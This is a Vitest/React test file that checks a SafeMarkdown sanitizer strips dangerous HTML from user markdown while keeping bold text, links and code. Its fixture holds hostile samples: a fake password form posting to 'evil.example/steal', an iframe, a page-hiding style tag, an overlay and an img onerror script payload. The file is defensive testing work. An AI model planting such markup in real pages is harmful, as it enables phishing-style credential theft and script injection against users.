// @vitest-environment jsdom
import { render } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { SafeMarkdown, safeMarkdownHtml } from './SafeMarkdown';

// docs/history/code-review.md H1: DOMPurify's defaults keep all of this.
const attack = [
	'**hello**',
	'<style>body{display:none}</style>',
	'<form action="https://evil.example/steal" method="post"><input name="password" type="password"><button>Sign in</button></form>',
	'<div style="position:fixed;inset:0" class="fixed inset-0 z-50" id="app">overlay</div>',
	'<iframe src="https://evil.example"></iframe><img src="x" onerror="alert(1)">'
].join('\n\n');

describe('SafeMarkdown', () => {
	it('keeps formatting but no styles, forms, embeds, script or layout attributes', () => {
		const { container } = render(<SafeMarkdown text={attack} />);
		const root = container.firstElementChild!;
		expect(root.querySelector('strong')?.textContent).toBe('hello');
		for (const tag of ['style', 'form', 'input', 'button', 'iframe', 'script'])
			expect(root.querySelector(tag)).toBeNull();
		expect(root.querySelector('[style], [class], [id], [onerror]')).toBeNull();
		expect(root.textContent).toContain('overlay');
	});
	it('keeps links and code', () => {
		const html = safeMarkdownHtml('[docs](https://example.com) and `code`');
		expect(html).toContain('<a href="https://example.com">docs</a>');
		expect(html).toContain('<code>code</code>');
	});
});
